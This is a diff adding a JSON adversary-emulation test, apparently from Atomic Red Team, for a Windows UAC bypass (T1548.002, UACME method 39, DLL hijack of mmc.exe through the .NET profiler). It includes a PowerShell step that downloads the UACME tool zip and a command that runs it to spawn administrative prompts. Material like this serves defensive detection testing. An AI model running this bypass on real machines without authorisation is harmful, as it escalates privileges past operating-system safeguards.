@@ -1,0 +1,38 @@
+{
+    "name": "UACME Bypass Method 39",
+    "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts. Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.  Author: Stefan Kanthak  Type:\tDll Hijack  Method: .NET Code Profiler  Target:\t\\system32\\mmc.exe  Component:\tAttacker defined  Implementation:\tucmCorProfilerMethod  UCM Method:\tUacMethodCorProfiler  https://github.com/hfiref0x/UACME ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "\"#{uacme_exe}\"\n",
+        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1548.002",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Bypass User Account Control",
+    "source": "ART",
+    "uuid": "56163687-081f-47da-bb9c-7b231c5585cf",
+    "arguments": {
+        "uacme_exe": {
+            "description": "Path to uacme executable",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
+            "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
